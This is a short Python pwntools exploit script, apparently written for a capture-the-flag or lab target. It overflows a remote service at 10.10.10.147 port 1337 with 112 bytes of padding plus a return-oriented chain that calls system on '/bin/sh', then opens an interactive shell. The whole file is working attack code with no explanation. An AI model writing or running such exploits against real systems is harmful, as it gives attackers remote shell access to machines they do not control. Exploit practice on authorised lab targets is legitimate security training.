from pwn import *
system = p64(0x40116e)
#p = process('./myapp')
p = remote('10.10.10.147',1337)
null = p64(0x0)
junk = 'A'*112
sh = '/bin/sh\x00'
pop_r13 = p64(0x401206)
test = p64(0x401152)
print(p.recvline())
#print(p.recvline())
#print(p.recvline())
#print(p.recvuntil('What do you want me to echo back?'))
p.sendline(junk+sh+pop_r13+system+null+null+test)
p.interactive()


